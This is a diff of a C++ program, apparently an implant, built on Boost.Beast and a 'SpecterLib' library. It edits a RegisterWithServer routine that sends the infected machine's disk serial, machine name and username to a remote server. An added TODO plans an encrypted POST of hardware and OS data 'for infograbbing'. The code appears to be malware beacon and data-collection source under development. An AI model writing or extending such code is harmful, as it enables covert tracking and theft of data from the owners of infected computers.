@@ -1,10 +1,10 @@
 #include <boost/beast.hpp>
-#include <boost/beast/core.hpp>
-#include <boost/beast/http.hpp>
-#include <boost/beast/version.hpp>
+//#include <boost/beast/core.hpp>
+//#include <boost/beast/http.hpp>
+//#include <boost/beast/version.hpp>
 
-#include "UserInfo.hpp"
-#include "SystemInfo.hpp"
+#include "SpecterLib/UserInfo.hpp"
+#include "SpecterLib/SystemInfo.hpp"
 
 #include <iostream>
 
@@ -30,7 +30,7 @@ void RegisterWithServer()
 	req.set(http::field::host, host);
 	req.set(http::field::user_agent, BOOST_BEAST_VERSION_STRING);
 	req.set("hdserial", SystemInfo::GetHdSerial());
-	req.set("computername", UserInfo::GetQualifiedUsername());
+	req.set("computername", UserInfo::GetMachineName());
 	req.set("username", UserInfo::GetUsername());
 
 	// Write, read and buffer the request
@@ -59,8 +59,8 @@ void PrintEndpointInfo()
 	std::cout << "Username: " << UserInfo::GetUsername() << std::endl;
 
 	// System info
-	std::cout << "Computer name: " << UserInfo::GetQualifiedUsername() << std::endl;
-	std::cout << "System uptime: " << SystemInfo::GetSystemUptime() << std::endl;
+	std::cout << "Computer name: " << UserInfo::GetMachineName() << std::endl;
+	std::cout << "System uptime: " << SystemInfo::GetUptime() << std::endl;
 	std::cout << "HdSerial: " << SystemInfo::GetHdSerial() << std::endl;
 }
 
@@ -78,3 +78,5 @@ int main()
 		std::cout << "Exception occurred: " << e.what() << std::endl;
 	}
 }
+
+// TODO send some hardware information, as well as OS version in a separate encrypted POST for infograbbing.
